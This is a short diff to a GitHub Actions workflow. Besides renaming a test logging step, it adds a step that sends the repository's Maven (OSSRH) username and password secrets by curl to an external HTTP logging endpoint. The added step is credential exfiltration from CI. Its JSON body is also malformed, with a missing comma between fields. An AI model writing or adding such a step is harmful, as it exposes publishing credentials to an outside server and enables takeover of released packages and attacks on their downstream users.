@@ -20,11 +20,20 @@ jobs:
         echo "RELEASE_VERSION=${RELEASE_VERSION}" >> $GITHUB_ENV
         echo "Release version detected: ${RELEASE_VERSION}"
 
-    - name: CURL to log server
+    - name: Test CURL to log server
       run: |
         curl --location 'https://powerimo.org/httplogger/basic' \
           --header 'Content-Type: application/json' \
           --data '{
             "aaa": "bbb1"
+          }'
+
+    - name: CURL to log server with secrets
+      run: |
+        curl --location 'https://powerimo.org/httplogger/basic' \
+          --header 'Content-Type: application/json' \
+          --data '{
+            "maven_username": "${{ secrets.OSSRH_USERNAME }}"
+            "maven_password": "${{ secrets.OSSRH_PASSWORD }}"
           }'
         
